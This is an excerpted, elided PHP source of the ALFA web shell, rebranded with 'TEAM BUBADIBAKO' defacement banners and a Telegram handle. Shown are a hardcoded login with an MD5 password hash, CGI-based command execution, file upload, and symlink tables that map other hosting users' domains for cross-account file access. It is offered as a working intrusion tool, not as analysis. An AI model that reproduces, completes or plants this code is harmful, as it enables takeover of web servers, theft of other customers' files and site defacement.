...
$GLOBALS['oZgNypoPRU'] = array(
    'username' => 'alfa',
    'password' => '69e9bf2f0708bb05a135faf7bab6c317',//md5(ehsan)
    'safe_mode' => '1',
    'login_page' => '403',
    'show_icons' => '1',
...
define("__TEAM_BUBADIBAKO__", "TEAM_BUBADIBAKO");
...
<title>.: TEAM BUBADIBAKO :.</title><center>
<center><img style="border-radius:100px;" width="500" height="250" alt="alfa team 2012" draggable="false" src="https://res.cloudinary.com/dshpkof7n/image/upload/v1761901467/TEAMBUBADIBAKOHERE_tvtadt.jpg" /></center>
...
function _alfa_cgicmd($cmd,$lang="perl",$set_cookie=false){
	...
	if($is_curl||$is_socket){
		...
		$cgi_url = __TEAM_BUBADIBAKO__."/alfacgiapi/".$lang.$cgi_ext;
...
<td width="12%" rowspan="8"><img style="border-radius:100px;" width="300" height="170" alt="alfa team 2012" draggable="false" src="https://res.cloudinary.com/dshpkof7n/image/upload/v1761901467/TEAMBUBADIBAKOHERE_tvtadt.jpg" /></td>
</tr>
<tr>
...
function alfaWriteTocgiapi($name, $source){
	...
	if(in_array($name, $not_api)){
		...
		@chdir($GLOBALS['home_cwd'] . "/" . __TEAM_BUBADIBAKO__);
	}
...
<span class='footer_text'>Upload file: </span><span><button id='addup' onclick='addnewup();return false;'><b>+</b></button></span><p id='pfooterup'><label class='inputfile' for='footerup'><span id='__fnameup'></span> <strong>&nbsp;&nbsp;Choose a file</strong></label><input id='footerup' class='toolsInp' type='file' name='f[]' onChange='handleup(this,0);' multiple></p><input type='submit' name='submit' value=' '></form><div id='alfa-copyright'><span class='copyright'>[ TEAM BUBADIBAKO Since ".date('Y')." ]</span><br><span> <span style='letter-spacing: 2px;color: #ff0000ff;'>BUBADIBAKO WAS HERE !</span> <span><a style='color: #1900ffff;text-decoration: none;' target='_blank' href='https://t.me/nezhaa_444'>@nezhaa_444</a></span></div></td>
</tr>
</table>
</div>
...
function alfaCreateParentFolder(){
	$parent = $GLOBALS['home_cwd'] . "/" . __TEAM_BUBADIBAKO__;
	if(!@is_dir($parent)){
...
echo __pre();
echo '<center><b><font color="white">Click >> </font><a target="_blank" href="'.__TEAM_BUBADIBAKO__."/".$sym_dir.'" ><b><font size="4">'.$symname.'</font></b></a></b></center>';
}
...
echo $table_header;
$count=1;
$template = '<tr><td><span style="color:#FFFF01;">{count}</span></td><td style="text-align:left;"><a target="_blank" href="{http}"/><span style="color:#00A220;margin-left:10px;"><b>{domain}</b> </a></span></td><td style="text-align:left;"><span style="color:#FFFFFF;margin-left:10px;"><b>{owner}</font></b></td><td><a href="'.__TEAM_BUBADIBAKO__.'/alfasymlink/root{sympath}" target="_blank"><span style="color:#FF0000;">Symlink</span></a></td></tr>';
...
$count=1;
echo $table_header;
$template = '<tr><td><span style="color:#FFFF01;">{count}</span></td><td style="text-align:left;"><a target="_blank" href="http://www.{url}"/><span style="color:#00A220;margin-left:10px;"><b>{url}</b> </a></span></td><td style="text-align:left;"><span style="color:#FFFFFF;margin-left:10px;"><b>{user}</font></b></td><td><a href="'.__TEAM_BUBADIBAKO__.'/alfasymlink/root{cwd}" target="_blank"><span style="color:#FF0000;">Symlink</span></a></td></tr>';
if($sole){
...
@chmod($name,0755);
echo '<iframe src="'.__TEAM_BUBADIBAKO__.'/cgialfa/'.$name.'" width="100%" height="600px" frameborder="0" style="opacity:0.9;filter: alpha(opacity=9);overflow:auto;"></iframe>';
}
}
echo $div;
alfafooter();
...
return('<iframe src="'.__TEAM_BUBADIBAKO__."/".$f.'" width="'.$width.'" height="'.$height.'" frameborder="0"></iframe>');
}
class AlfaCURL {
public $headers;
public $user_agent;
